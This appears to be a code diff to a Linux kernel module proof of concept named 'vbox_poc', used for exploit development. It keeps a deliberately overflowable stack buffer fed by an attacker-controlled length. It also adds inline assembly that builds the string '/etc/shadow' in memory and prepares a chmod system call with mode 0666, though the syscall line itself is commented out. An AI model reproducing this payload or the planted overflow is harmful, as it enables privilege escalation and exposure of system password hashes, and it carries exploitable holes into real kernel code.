@@ -27,7 +27,7 @@ MODULE_PARM_DESC(exploit_length, "Length of payload");
 
 unsigned long long strtoull(const char *nptr, char **endptr, int base);
 
-void vulnerable_func(const char * msg, ssize_t msg_size) {
+void vulnerable_func(const char *msg, ssize_t msg_size) {
   // The buffer we will overflow
   char overflow_me[OF_SIZE];
   // Doh! Used size of attacker controlled not defender controlled for copy!
@@ -38,6 +38,38 @@ void vulnerable_func(const char * msg, ssize_t msg_size) {
   // asm("pop %rax; pop %rax; retq;");
 }
 
+// This is the asm version of the payload
+void do_syscall(const char *string_location_str) {
+  uintptr_t string_location = strtoull(string_location_str, NULL, 16);
+  uintptr_t string_location_4 = string_location + 4;
+  uintptr_t string_location_8 = string_location + 8;
+
+  printk(INFO "do_syscall: string_location %p\n", (void *)string_location);
+
+  asm volatile("mov $0x6374652f, %rax;");
+  asm volatile("mov %0, %%rdi;" : "=r"(string_location));
+  asm volatile("mov %rax, (%rdi);");
+
+  asm volatile("mov $0x6168732f, %rax;");
+  asm volatile("mov %0, %%rdi;" : "=r"(string_location_4));
+  asm volatile("mov %rax, (%rdi);");
+
+  asm volatile("mov $0x00776f64, %rax;");
+  asm volatile("mov %0, %%rdi;" : "=r"(string_location_8));
+  asm volatile("mov %rax, (%rdi);");
+
+  printk(INFO "do_syscall: string at string_location \"%s\"\n",
+         (const char *)string_location);
+
+  asm volatile("mov $0x05a, %rax;");
+  asm volatile("mov %0, %%rdi;" : "=r"(string_location));
+  asm volatile("mov $0x01b6, %rsi;");
+
+  // asm volatile ("syscall;");
+
+  asm volatile("mov $0x0, %rax;");
+}
+
 static int __init vbox_poc_init(void) {
   int i;
   int j;
@@ -46,27 +78,28 @@ static int __init vbox_poc_init(void) {
 
   printk(INFO "Loaded\n");
 
+  /*
   str_len = strlen(exploit_payload);
   for (i = 0, j = 0; i < str_len; i += 2, ++j) {
-	buf[0] = exploit_payload[i];
-	buf[1] = exploit_payload[i + 1];
+    buf[0] = exploit_payload[i];
+    buf[1] = exploit_payload[i + 1];
     exploit_payload[j] = strtoull(buf, NULL, 16);
     // printk(INFO "exploit_payload[%d]: %02x\n", j, exploit_payload[j]);
   }
+  */
 
   // printk(INFO "Exploit payload: %x\n", exploit_payload[exploit_length]);
   printk(INFO "Payload length: %d\n", exploit_length);
 
   printk(INFO "Calling vulnerable_func\n");
-  vulnerable_func(exploit_payload, exploit_length);
+  // vulnerable_func(exploit_payload, exploit_length);
+  do_syscall(exploit_payload);
   printk(INFO "Done with vulnerable_func\n");
 
   return 0;
 }
 
-static void __exit vbox_poc_exit(void) {
-  printk(INFO "Unloaded\n");
-}
+static void __exit vbox_poc_exit(void) { printk(INFO "Unloaded\n"); }
 
 unsigned long long strtoull(const char *nptr, char **endptr, int base) {
   const char *s;
